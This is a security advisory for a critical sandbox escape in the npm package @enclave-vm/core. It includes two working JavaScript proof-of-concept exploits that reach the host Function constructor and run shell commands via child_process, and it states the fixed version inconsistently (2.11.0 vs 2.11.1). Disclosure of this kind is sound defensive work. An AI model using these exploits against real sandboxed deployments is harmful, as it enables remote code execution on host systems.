# [C] @enclave-vm/core is vulnerable to Sandbox Escape

## Summary
Severity: Critical
Advisory: GHSA-f229-3862-4942
CVE: CVE-2026-27597
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-f229-3862-4942
Type: github-advisory

## Affected
- npm: `@enclave-vm/core` — affected >=0 <2.11.1

## Details
## Summary

It is possible to escape the security boundraries set by `@enclave-vm/core`, which can be used to achieve remote code execution (RCE).

The issue has been fixed in version **2.11.1**.

---

## Details

It is possible to obtain the native `Object` constructor (instead of the `SafeObject` wrapper). This can be used to get retrieve property descriptors via `Object.getOwnPropertyDescriptors`, allowing access to properties otherwise restricted by the sandbox.

When a memory limit is set (which is the default), `__host_memory_track__`, a host object, can be used to escape via the host function constructor.

When this is not the case, a host reference can be obtained via Node's `nodejs.util.inspect.custom` symbol (which can be triggered, for example, through `console.log`).

---

## Proof of Concept

### PoC 1

```js
const { Enclave } = require("@enclave-vm/core");

const enclave = new Enclave({
  securityLevel: "SECURE",
  toolHandler: () => {},
});

const result = enclave.run(`
const op = {}[["__proto__"]];
const ho = op[["constructor"]];

const glob = ho.getOwnPropertyDescriptors(this);

return {
  res: glob.__host_memory_track__.value[["constructor"]]("return process")()
    .getBuiltinModule("child_process")
    .execSync("id")
    .toString()
    .split("\\n"),
};`);

result
  .then((v) => console.log("success", v))
  .catch((e) => console.log("failure", e));
```

---

### PoC 2

```js
const { Enclave } = require("@enclave-vm/core");

const enclave = new Enclave({
  securityLevel: "STRICT",
  toolHandler: () => {},
  memoryLimit: 0,
});

const result = enclave.run(`
const op = {}[['__proto__']];
const ho = op[['constructor']];

const glob = ho.getOwnPropertyDescriptors(this);

const sym = glob[['Symbol']].value.for('nodejs.util.inspect.custom');

let result;
const obj = {
  [sym]: (depth, option, inspect) => {
    result = inspect[['constructor']]
      [['constructor']]('return process')()
      .getBuiltinModule('child_process')
      .execSync('id')
      .toString();
  },
};

glob.__safe_console.value.log(obj);
return { result }
`);

result
  .then((v) => console.log("success", v))
  .catch((e) => console.log("failure", e));
```

---

## Impact

This vulnerability allows a malicious actor executing untrusted code inside an Enclave instance to escape the sandbox and execute arbitrary commands on the host system.

This constitutes **Remote Code Execution (RCE)** and should be considered **Critical severity**.

---

## Remediation

The issue has been fixed in **v2.11.0** with the following hardening measures:

* Strengthened intrinsic object isolation
* Improved console isolation
* Hardened host callback exposure paths
* Closed AST validation gaps
* Added additional defensive checks around constructor access and prototype traversal

All known escape paths demonstrated in the PoCs are now blocked.

Users are strongly advised to upgrade to **v2.11.1** or later immediately.

---

## Credit

Enclave would like to thank **@c0rydoras** for responsibly reporting this issue and for providing detailed proof-of-concept examples.

## References
- https://github.com/agentfront/enclave/security/advisories/GHSA-f229-3862-4942
- https://nvd.nist.gov/vuln/detail/CVE-2026-27597
- https://github.com/agentfront/enclave/commit/09afbebe4cb6d0586c1145aa71ffabd2103932db
- https://github.com/agentfront/enclave
